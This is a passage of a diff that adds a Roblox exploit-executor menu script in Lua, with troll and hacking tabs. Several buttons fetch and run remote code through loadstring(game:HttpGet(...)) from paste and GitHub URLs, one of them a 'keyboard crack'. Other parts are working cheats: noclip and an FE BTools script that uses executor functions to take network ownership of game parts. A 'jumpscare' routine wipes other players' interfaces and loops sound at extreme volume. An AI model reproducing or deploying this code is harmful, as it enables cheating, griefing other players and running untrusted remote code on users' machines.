+		math.floor(song.TimePosition / 60), song.TimePosition % 60,
+		math.floor(song.TimeLength / 60), song.TimeLength % 60
+	)
+
+	song.Playing = not Player.Paused
+	song.Volume = Player.Volume
+end)
+
+while true do
+	local currentSong = Player.Songs[Player.CurrentIndex]
+	song.SoundId = currentSong.Id
+	container.SongName.Text = currentSong.Name
+
+	song:Play()
+	Player.PlayNext.Event:Wait()
+	
+	changeIndex(1)
+end
+   end,
+})
+
+local Tab = Window:CreateTab("Troll🤣", 4483362458) -- Title, Image
+
+
+local Button = Tab:CreateButton({
+   Name = "you are an idiot jumpscare😬",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+
+for _, gui in pairs(CoreGui:GetChildren()) do
+    if not gui:IsA("CoreScript") and not gui:IsA("PlayerList") then
+        gui:Destroy()
+    end
+end
+
+StarterGui:SetCore("ChatActive", false)
+StarterGui:SetCore("TopbarEnabled", false)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.F4 and UserInputService:IsKeyDown(Enum.KeyCode.LeftAlt) then
+        game:GetService("GuiService"):ClearError()
+    elseif input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.F4 then
+        game:GetService("GuiService"):ClearError()
+    end
+end)
+
+spawn(function()
+    while true do
+        print("YOU ARE A IDIOT HAHAHA")
+        wait(1)
+    end
+end)
+
+for _, v in pairs(game.Players:GetPlayers()) do
+    if v.Name ~= me and v:FindFirstChild("PlayerGui") then
+        for _, gui in pairs(v.PlayerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui.Name ~= "Idiot" then
+                gui:Destroy()
+            end
+        end
+
+        if not v.PlayerGui:FindFirstChild("Idiot") then
+            spawn(function()
+                local newgui = Instance.new("ScreenGui", v.PlayerGui)
+                newgui.Name = "Idiot"
+
+                local song = Instance.new("Sound", newgui)
+                song.SoundId = "rbxassetid://2665943889"
+                song.Volume = 5876
+                song.Looped = true
+                song:Play()
+
+                local jumpscares = {
+                    "http://www.roblox.com/asset/?id=10954634699",
+                    "http://www.roblox.com/asset/?id=530330570"
+                }
+
+                local function createJumpscare(imageId)
+                    local newimage = Instance.new("ImageLabel", newgui)
+                    newimage.Image = imageId
+                    newimage.Size = UDim2.new(1, 0, 1, 0)
+                    newimage.BackgroundTransparency = 1
+                    return newimage
+                end
+
+                local images = {}
+                for _, imageId in ipairs(jumpscares) do
+                    table.insert(images, createJumpscare(imageId))
+                end
+
+                local index = 1
+                while true do
+                    for i, img in ipairs(images) do
+                        img.Visible = (i == index)
+                    end
+                    index = index == #images and 1 or index + 1
+                    wait(0.06777779)
+                end
+            end)
+        end
+    end
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "JERK OFF😩",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
+   end,
+})
+
+local Tab = Window:CreateTab("H4XXING GUI FEATURE💀⚡️[1]", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "Noclip👻",
+   Callback = function()
+   -- The function that takes place when the button is pressedlocal Workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local Noclip = Instance.new("ScreenGui")
+local BG = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Toggle = Instance.new("TextButton")
+local StatusPF = Instance.new("TextLabel")
+local Status = Instance.new("TextLabel")
+local Plr = Players.LocalPlayer
+local Clipon = false
+
+Noclip.Name = "Noclip"
+Noclip.Parent = game.CoreGui
+
+BG.Name = "BG"
+BG.Parent = Noclip
+BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
+BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
+BG.BorderSizePixel = 2
+BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
+BG.Size = UDim2.new(0, 210, 0, 127)
+BG.Active = true
+BG.Draggable = true
+
+Title.Name = "Title"
+Title.Parent = BG
+Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
+Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
+Title.BorderSizePixel = 2
+Title.Size = UDim2.new(0, 210, 0, 33)
+Title.Font = Enum.Font.Highway
+Title.Text = "Noclip"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.FontSize = Enum.FontSize.Size32
+Title.TextSize = 30
+Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
+Title.TextStrokeTransparency = 0
+
+Toggle.Parent = BG
+Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
+Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
+Toggle.BorderSizePixel = 2
+Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
+Toggle.Size = UDim2.new(0, 146, 0, 36)
+Toggle.Font = Enum.Font.Highway
+Toggle.FontSize = Enum.FontSize.Size28
+Toggle.Text = "Toggle"
+Toggle.TextColor3 = Color3.new(1, 1, 1)
+Toggle.TextSize = 25
+Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
+Toggle.TextStrokeTransparency = 0
+
+StatusPF.Name = "StatusPF"
+StatusPF.Parent = BG
+StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
+StatusPF.BackgroundTransparency = 1
+StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
+StatusPF.Size = UDim2.new(0, 56, 0, 20)
+StatusPF.Font = Enum.Font.Highway
+StatusPF.FontSize = Enum.FontSize.Size24
+StatusPF.Text = "Status:"
+StatusPF.TextColor3 = Color3.new(1, 1, 1)
+StatusPF.TextSize = 20
+StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
+StatusPF.TextStrokeTransparency = 0
+StatusPF.TextWrapped = true
+
+Status.Name = "Status"
+Status.Parent = BG
+Status.BackgroundColor3 = Color3.new(1, 1, 1)
+Status.BackgroundTransparency = 1
+Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
+Status.Size = UDim2.new(0, 56, 0, 20)
+Status.Font = Enum.Font.Highway
+Status.FontSize = Enum.FontSize.Size14
+Status.Text = "off"
+Status.TextColor3 = Color3.new(0.666667, 0, 0)
+Status.TextScaled = true
+Status.TextSize = 14
+Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
+Status.TextWrapped = true
+Status.TextXAlignment = Enum.TextXAlignment.Left
+
+
+Toggle.MouseButton1Click:connect(function()
+	if Status.Text == "off" then
+		Clipon = true
+		Status.Text = "on"
+		Status.TextColor3 = Color3.new(0,185,0)
+		Stepped = game:GetService("RunService").Stepped:Connect(function()
+			if not Clipon == false then
+				for a, b in pairs(Workspace:GetChildren()) do
+                if b.Name == Plr.Name then
+                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
+                if v:IsA("BasePart") then
+                v.CanCollide = false
+                end end end end
+			else
+				Stepped:Disconnect()
+			end
+		end)
+	elseif Status.Text == "on" then
+		Clipon = false
+		Status.Text = "off"
+		Status.TextColor3 = Color3.new(170,0,0)
+	end
+end)
+
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Chat Hax💬",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/LeoVerem14/Chat-haxx/main/Main")))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Roblox audio Music🎵",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yeerma/such/main/ftg'))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Universal Anti- Chat Banner / Logger💬🚫",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet('https://raw.githubusercontent.com/katrina367/ScriptBlox-Projects/main/Anti%20Chat%20Banner'))() 
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Roblox FullBright🖤👁",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+if not _G.FullBrightExecuted then
+
+	_G.FullBrightEnabled = false
+
+	_G.NormalLightingSettings = {
+		Brightness = game:GetService("Lighting").Brightness,
+		ClockTime = game:GetService("Lighting").ClockTime,
+		FogEnd = game:GetService("Lighting").FogEnd,
+		GlobalShadows = game:GetService("Lighting").GlobalShadows,
+		Ambient = game:GetService("Lighting").Ambient
+	}
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
+		if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
+			_G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").Brightness = 1
+		end
+	end)
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
+		if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
+			_G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").ClockTime = 12
+		end
+	end)
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
+		if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
+			_G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").FogEnd = 786543
+		end
+	end)
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
+		if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
+			_G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").GlobalShadows = false
+		end
+	end)
+
+	game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
+		if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
+			_G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
+			if not _G.FullBrightEnabled then
+				repeat
+					wait()
+				until _G.FullBrightEnabled
+			end
+			game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
+		end
+	end)
+
+	game:GetService("Lighting").Brightness = 1
+	game:GetService("Lighting").ClockTime = 12
+	game:GetService("Lighting").FogEnd = 786543
+	game:GetService("Lighting").GlobalShadows = false
+	game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
+
+	local LatestValue = true
+	spawn(function()
+		repeat
+			wait()
+		until _G.FullBrightEnabled
+		while wait() do
+			if _G.FullBrightEnabled ~= LatestValue then
+				if not _G.FullBrightEnabled then
+					game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
+					game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
+					game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
+					game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
+					game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
+				else
+					game:GetService("Lighting").Brightness = 1
+					game:GetService("Lighting").ClockTime = 12
+					game:GetService("Lighting").FogEnd = 786543
+					game:GetService("Lighting").GlobalShadows = false
+					game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
+				end
+				LatestValue = not LatestValue
+			end
+		end
+	end)
+end
+
+_G.FullBrightExecuted = true
+_G.FullBrightEnabled = not _G.FullBrightEnabled
+   end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "Delta keyboard crack reupload⌨️",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Grab Knife V4 [VISUAL]🔪",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://raw.githubusercontent.com/markizunkot/markizunkot/refs/heads/main/desfes", true))()
+   end,
+})
+
+local Tab = Window:CreateTab("H4XXING GUI FEATURE💀⚡️[2]", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "BTOOLS🛠",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+if not getgenv().Network then
+	getgenv().Network = {
+		BaseParts = {};
+		FakeConnections = {};
+		Connections = {};
+		Output = {
+			Enabled = true;
+			Prefix = "[NETWORK] ";
+			Send = function(Type,Output,BypassOutput)
+				if typeof(Type) == "function" and (Type == print or Type == warn or Type == error) and typeof(Output) == "string" and (typeof(BypassOutput) == "nil" or typeof(BypassOutput) == "boolean") then
+					if Network["Output"].Enabled == true or BypassOutput == true then
+						Type(Network["Output"].Prefix..Output);
+					end;
+				elseif Network["Output"].Enabled == true then
+					error(Network["Output"].Prefix.."Output Send Error : Invalid syntax.");
+				end;
+			end;
+		};
+		CharacterRelative = false;
+	}
+
+	Network["Output"].Send(print,": Loading.")
+	Network["Velocity"] = Vector3.new(14.46262424,14.46262424,14.46262424); --exactly 25.1 magnitude
+	Network["RetainPart"] = function(Part,ReturnFakePart) --function for retaining ownership of unanchored parts
+		assert(typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace),Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg1 (Part) must be a BasePart which is a descendant of workspace.")
+		assert(typeof(ReturnFakePart) == "boolean" or typeof(ReturnFakePart) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg2 (ReturnFakePart) must be a boolean or nil.")
+		if not table.find(Network["BaseParts"],Part) then
+			if Network.CharacterRelative == true then
+				local Character = LocalPlayer.Character
+				if Character and Character.PrimaryPart then
+					local Distance = (Character.PrimaryPart.Position-Part.Position).Magnitude
+					if Distance > 1000 then
+						Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
+						return false
+					end
+				else
+					Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
+					return false
+				end
+			end
+			table.insert(Network["BaseParts"],Part)
+			Part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
+			Network["Output"].Send(print,"PartOwnership Output : PartOwnership applied to BasePart "..Part:GetFullName()..".")
+			if ReturnFakePart == true then
+				return FakePart
+			end
+		else
+			Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it already active.")
+			return false
+		end
+	end
+
+	Network["RemovePart"] = function(Part) --function for removing ownership of unanchored part
+		assert(typeof(Part) == "Instance" and Part:IsA("BasePart"),Network["Output"].Prefix.."RemovePart Error : Invalid syntax: Arg1 (Part) must be a BasePart.")
+		local Index = table.find(Network["BaseParts"],Part)
+		if Index then
+			table.remove(Network["BaseParts"],Index)
+			Network["Output"].Send(print,"RemovePart Output: PartOwnership removed from BasePart "..Part:GetFullName()..".")
+		else
+			Network["Output"].Send(warn,"RemovePart Warning : BasePart "..Part:GetFullName().." not found in BaseParts table.")
+		end
+	end
+
+	Network["SuperStepper"] = Instance.new("BindableEvent") --make super fast event to connect to
+	for _,Event in pairs({RunService.Stepped,RunService.Heartbeat}) do
+		Event:Connect(function()
+			return Network["SuperStepper"]:Fire(Network["SuperStepper"],tick())
+		end)
+	end
+
+	Network["PartOwnership"] = {};
+	Network["PartOwnership"]["PreMethodSettings"] = {};
+	Network["PartOwnership"]["Enabled"] = false;
+	Network["PartOwnership"]["Enable"] = coroutine.create(function() --creating a thread for network stuff
+		if Network["PartOwnership"]["Enabled"] == false then
+			Network["PartOwnership"]["Enabled"] = true --do cool network stuff before doing more cool network stuff
+			Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus = LocalPlayer.ReplicationFocus
+			LocalPlayer.ReplicationFocus = workspace
+			Network["PartOwnership"]["PreMethodSettings"].SimulationRadius = gethiddenproperty(LocalPlayer,"SimulationRadius")
+			Network["PartOwnership"]["Connection"] = Network["SuperStepper"].Event:Connect(function() --super fast asynchronous loop
+				sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
+				for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
+					coroutine.wrap(function()
+						if Part:IsDescendantOf(workspace) then
+							if Network.CharacterRelative == true then
+								local Character = LocalPlayer.Character;
+								if Character and Character.PrimaryPart then
+									local Distance = (Character.PrimaryPart.Position - Part.Position).Magnitude
+									if Distance > 1000 then
+										Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
+										Lost = true;
+										Network["RemovePart"](Part)
+									end
+								else
+									Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
+								end
+							end
+							Part.Velocity = Network["Velocity"]+Vector3.new(0,math.cos(tick()*10)/100,0) --keep network by sending physics packets of 30 magnitude + an everchanging addition in the y level so roblox doesnt get triggered and fuck your ownership
+						else
+							Network["RemovePart"](Part)
+						end
+					end)()
+				end
+			end)
+			Network["Output"].Send(print,"PartOwnership Output : PartOwnership enabled.")
+		else
+			Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already enabled.")
+		end
+	end)
+	Network["PartOwnership"]["Disable"] = coroutine.create(function()
+		if Network["PartOwnership"]["Connection"] then
+			Network["PartOwnership"]["Connection"]:Disconnect()
+			LocalPlayer.ReplicationFocus = Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus
+			sethiddenproperty(LocalPlayer,"SimulationRadius",Network["PartOwnership"]["PreMethodSettings"].SimulationRadius)
+			Network["PartOwnership"]["PreMethodSettings"] = {}
+			for _,Part in pairs(Network["BaseParts"]) do
+				Network["RemovePart"](Part)
+			end
+			Network["PartOwnership"]["Enabled"] = false
+			Network["Output"].Send(print,"PartOwnership Output : PartOwnership disabled.")
+		else
+			Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already disabled.")
+		end
+	end)
+	Network["Output"].Send(print,": Loaded.")
+end
+
+coroutine.resume(Network["PartOwnership"]["Enable"])
+
+player = game:GetService("Players").LocalPlayer
+Gui = player.PlayerGui
+Backpack = player.Backpack
+Mouse = player:GetMouse()
+
+Parts_Folder = Instance.new("Folder",workspace)
+
+for i, Hat in pairs(player.Character:GetChildren()) do
+	if Hat:IsA("Accessory") then
+		local Part = Instance.new("Part",Parts_Folder)
+		Part.Name = Hat.Name
+		Part.Anchored = true
+		Part.Size = Hat.Handle.Size
+		Part.Position = player.Character.Head.Position + Vector3.new(math.random(-5,5),math.random(-1,1),math.random(-5,5))
+		Part:SetAttribute("Moveable",true)
+		Part.Material = Enum.Material.SmoothPlastic
+		Part.CanCollide = false
+        Part.Color = Color3.new(1,0,0)
+	end
+end
+
+
+Move_Tool = Instance.new("Tool",Backpack)
+Rotate_Tool = Instance.new("Tool",Backpack)
+MHandle = Instance.new("Part",Move_Tool)
+RHandle = Instance.new("Part",Rotate_Tool)
+Mgrabs = Instance.new("Handles",Gui)
+Rgrabs = Instance.new("ArcHandles",Gui)
+Outline = Instance.new("Highlight")
+
+Move_Tool.Name = "Move"
+Move_Tool.CanBeDropped = false
+
+Rotate_Tool.Name = "Rotate"
+Rotate_Tool.CanBeDropped = false
+
+MHandle.Name = "Handle"
+MHandle.Transparency = 1
+
+RHandle.Name = "Handle"
+RHandle.Transparency = 1
+
+Mgrabs.Visible = false
+Mgrabs.Color3 = Color3.fromRGB(248, 236, 0)
+Mgrabs.Style = "Movement"
+
+Rgrabs.Visible = false
+
+Outline.FillTransparency = 1
+Outline.OutlineTransparency = 0
+
+Active_Part = nil
+
+Move_Tool.Equipped:Connect(function()
+	if Active_Part ~= nil then
+		Mgrabs.Visible = true
+		Mgrabs.Adornee = Active_Part
+	end
+end)
+
+Move_Tool.Unequipped:Connect(function()
+	Mgrabs.Visible = false
+	Mgrabs.Adornee = nil
+end)
+
+Move_Tool.Activated:Connect(function()
+	if Mouse.Target:GetAttribute("Moveable") then
+		Active_Part = Mouse.Target
+		Mgrabs.Visible = true
+		Mgrabs.Adornee = Active_Part
+		Outline.Parent = Active_Part
+	end
+end)
+
+Rotate_Tool.Equipped:Connect(function()
+	if Active_Part ~= nil then
+		Rgrabs.Visible = true
+		Rgrabs.Adornee = Active_Part
+	end
+end)
+
+Rotate_Tool.Unequipped:Connect(function()
+	Rgrabs.Visible = false
+	Rgrabs.Adornee = nil
+end)
+
+Rotate_Tool.Activated:Connect(function()
+	if Mouse.Target:GetAttribute("Moveable") then
+		Active_Part = Mouse.Target
+		Rgrabs.Visible = true
+		Rgrabs.Adornee = Active_Part
+		Outline.Parent = Active_Part
+	end
+end)
+
+MOGCFrame = CFrame.new()
+
+Mgrabs.MouseButton1Down:Connect(function()
+	MOGCFrame = Active_Part.CFrame
+end)
+
+Mgrabs.MouseDrag:Connect(function(knob, pos)
+	if knob == Enum.NormalId.Front then
+		Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * pos
+	end
+	if knob == Enum.NormalId.Back then
+		Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * -pos
+	end
+	if knob == Enum.NormalId.Top then
+		Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * pos
+	end
+	if knob == Enum.NormalId.Bottom then
+		Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * -pos
+	end
+	if knob == Enum.NormalId.Left then
+		Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * -pos
+	end
+	if knob == Enum.NormalId.Right then
+		Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * pos
+	end
+end)
+
+ROGCFrame = CFrame.new()
+
+Rgrabs.MouseButton1Down:Connect(function()
+	ROGCFrame = Active_Part.CFrame
+end)
+
+Rgrabs.MouseDrag:Connect(function(knob, angle)
+	if knob == Enum.Axis.Y then
+		Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,angle,0)
+	end
+	if knob == Enum.Axis.X then
+		Active_Part.CFrame = ROGCFrame * CFrame.Angles(angle,0,0)
+	end
+	if knob == Enum.Axis.Z then
+		Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,0,angle)
+	end
+end)
+
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "FE BTools V3 Succesfully Loaded",
+	Text = "Enjoy",
+	Icon = "rbxassetid://12561999923"
+})
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Network Credit:",
+	Text = "thanks to 4eyes for network stuff",
+	Icon = "rbxassetid://12561999923"
+})
+
+HRP = player.Character.HumanoidRootPart
+
+for i, Part in pairs(Parts_Folder:GetChildren()) do
+	local Hat = player.Character[Part.Name].Handle
+	Hat.AccessoryWeld:Destroy()
+    Network.RetainPart(Hat)
+	local vbreak = false
+	coroutine.wrap(function()
+		while task.wait() do
+			if vbreak == true then break end
+			Hat.CFrame = Part.CFrame
+		end
+	end)()
+	Hat:FindFirstChildWhichIsA("SpecialMesh"):Destroy()
+end
+
+player.Character.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
+	Parts_Folder:Destroy()
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "RED SKY🔴🏙",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+-- Universal red sky for any game
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+
+-- Create & apply the skybox
+local Skybox = Instance.new("Sky")
+Skybox.SkyboxBk = "rbxassetid://92464172"
+Skybox.SkyboxDn = "rbxassetid://92464250"
+Skybox.SkyboxFt = "rbxassetid://92464217"
+Skybox.SkyboxLf = "rbxassetid://92464234"
+Skybox.SkyboxRt = "rbxassetid://92464189"
+Skybox.SkyboxUp = "rbxassetid://92464157"
+Skybox.Parent = Lighting  -- Apply to the game
+
+-- Optional: remove color correction or sun effects
+RunService.Stepped:Connect(function()
+    for _, cls in ipairs({"ColorCorrection", "Correction"}) do
+        if Lighting:FindFirstChild(cls) then
+            Lighting[cls]:Destroy()
+        end
+    end
+    local sun = Lighting:FindFirstChildOfClass("SunRaysEffect")
+    if sun then sun:Destroy() end
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "WHITE CHARACTER FLAME🤍🔥",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+-- 🔥 Only-You White Fire Script (Visible to Others)
+-- Place this in ServerScriptService
+
+local Players = game:GetService("Players")
+
+-- Replace with your Roblox UserId
+local YOUR_USER_ID = 8317715190 -- ⬅️ Change this to your real UserId
+
+local function igniteCharacter(character)
+	for _, part in pairs(character:GetChildren()) do
+		if part:IsA("BasePart") and not part:FindFirstChild("WhiteFire") then
+			local fire = Instance.new("Fire")
+			fire.Name = "WhiteFire"
+			fire.Size = 25
+			fire.Heat = 15
+			fire.Color = Color3.new(1, 1, 1)
+			fire.SecondaryColor = Color3.new(0.9, 0.9, 0.9)
+			fire.Parent = part
+		end
+	end
+end
+
+-- Trigger fire effect only for your character
+Players.PlayerAdded:Connect(function(player)
+	if player.UserId == YOUR_USER_ID then
+		player.CharacterAdded:Connect(function(character)
+			wait(1)
+			igniteCharacter(character)
+		end)
+	end
+end)
+
+-- Optional: for live test, ignite instantly if you're already in the game
+for _, player in ipairs(Players:GetPlayers()) do
+	if player.UserId == YOUR_USER_ID and player.Character then
+		igniteCharacter(player.Character)
+	end
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Undo WHITE FLAME CHARACTER🤍🔥",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+-- 🧯 Undo White Flame Character Effect (Server-Side)
+-- Put this script in ServerScriptService
+
+local Players = game:GetService("Players")
+
+-- Replace with your real Roblox UserId
+local YOUR_USER_ID = 8317715190  -- ← Change this!
+
+local function undoWhiteFlameEffect(character)
+	for _, part in pairs(character:GetDescendants()) do
+		if part:IsA("BasePart") then
+			-- Remove fire effect
+			local fire = part:FindFirstChild("WhiteFire")
+			if fire then
+				fire:Destroy()
+			end
+
+			-- Reset material and color
+			part.Material = Enum.Material.Plastic
+			part.Color = Color3.new(0.8, 0.8, 0.8) -- light gray
+		end
+	end
+
+	-- Remove any Highlight (optional)
+	local highlight = character:FindFirstChildOfClass("Highlight")
+	if highlight then
+		highlight:Destroy()
+	end
+end
+
+Players.PlayerAdded:Connect(function(player)
+	if player.UserId == YOUR_USER_ID then
+		player.CharacterAdded:Connect(function(character)
+			wait(1)
+			undoWhiteFlameEffect(character)
+		end)
+	end
+end)
+
+-- Optional: apply immediately if player is already in-game
+for _, player in ipairs(Players:GetPlayers()) do
+	if player.UserId == YOUR_USER_ID and player.Character then
+		undoWhiteFlameEffect(player.Character)
+	end
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Rejoin [TYPE IN CHAT !rejoin TO REJOIN]▶️",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+-- LocalScript (in StarterPlayerScripts)
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local PLACE_ID = game.PlaceId
+local JOB_ID = game.JobId
+
+local player = Players.LocalPlayer
+player.Chatted:Connect(function(msg)
+    if msg:lower() == "!rejoin" then
+        TeleportService:TeleportToPlaceInstance(PLACE_ID, JOB_ID, player)
+    end
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "NEON GLOW CHARACTER🔳👤",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+-- Server-side script: Place in ServerScriptService
+
+local Players = game:GetService("Players")
+
+-- Adjust this to control neon glow intensity
+local NEON_MATERIAL = Enum.Material.Neon
+local GLOW_COLOR = Color3.new(0.8, 0.8, 1) -- pale blue glow
+
+local function applyNeon(character)
+    for _, part in pairs(character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Material = NEON_MATERIAL
+            part.Color = GLOW_COLOR
+        end
+    end
+end
+
+local function onPlayer(player)
+    player.CharacterAdded:Connect(function(char)
+        char:WaitForChild("HumanoidRootPart") -- ensure character is ready
+        applyNeon(char)
+    end)
+    -- If character already exists (live mode), apply immediately:
+    if player.Character then
+        applyNeon(player.Character)
+    end
+end
+
+-- Apply to each player (existing + new)
+for _, plr in pairs(Players:GetPlayers()) do
+    onPlayer(plr)
+end
+Players.PlayerAdded:Connect(onPlayer)
+   end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "Undo NEON GLOW CHARACTER🔳👤",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+-- 🧯 Undo Neon Glow (Character Reset Script)
+-- Put this in ServerScriptService
+
+local Players = game:GetService("Players")
+
+-- Replace this with your actual Roblox UserId
+local YOUR_USER_ID = 8317715190  -- ← Change this to your UserId
+
+local function removeNeonGlow(character)
+	for _, part in pairs(character:GetDescendants()) do
+		if part:IsA("BasePart") then
+			if part.Material == Enum.Material.Neon then
+				part.Material = Enum.Material.Plastic
